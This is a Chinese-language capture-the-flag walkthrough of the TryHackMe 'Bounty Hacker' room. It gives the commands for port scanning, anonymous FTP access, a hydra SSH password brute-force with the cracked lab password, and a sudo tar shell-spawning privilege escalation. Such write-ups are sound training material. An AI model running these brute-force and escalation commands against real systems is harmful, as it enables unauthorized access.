# Bounty Hacker
> URL : https://tryhackme.com/room/cowboyhacker

IP : 10.10.164.54

## Recon
- 掃 Port
    - `rustscan -a 10.10.164.54 -r 1-65535`
        - ![](https://i.imgur.com/OHdpHys.png)
		- 21
		- 22
		- 80
    - `nmap -A -p21,22,80 10.10.164.54`
        - ![](https://i.imgur.com/fX6jwMc.png)
        - FTP 可以匿名登入 !!
- 觀察首頁
    - ![](https://i.imgur.com/TcipcZA.jpg)
    - 沒啥東東
- dirsearch
    - 也沒啥東東
    - ![](https://i.imgur.com/e6Yx7KD.png)

## FTP Anonymous login
- FTP 登入
    - ![](https://i.imgur.com/eDhLW7K.png)
    - 裡面有兩ㄍ檔案都載下來
- FTP 檔案
    - ![](https://i.imgur.com/OHreXEW.png)
        - 作者是 `lin`
    - ![](https://i.imgur.com/jeU8FFE.png)
        - 看起來是一個密碼表

## 爆破密碼
- `hydra -l 'lin' -P locks.txt ssh://10.10.164.54`
    - ![](https://i.imgur.com/V5VCmJA.png)
    - 帳號 : `lin` 
    - 密碼 : `RedDr4gonSynd1cat3`
- SSH 登入成功
    - ![](https://i.imgur.com/EMmqpa7.png)
- 取得 user flag
    - ![](https://i.imgur.com/y5O6qRV.png)


## 提權
- 起手式 `sudo -l`
    - ![](https://i.imgur.com/VrYqxmz.png)
    - 發現可以用 `sudo tar`
- GTFOBins 尋找 tar sudo 提權
    - https://gtfobins.github.io/gtfobins/tar/#sudo
    - `    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
- 提權完畢，取得 root flag
    - ![](https://i.imgur.com/0kebDB6.png)
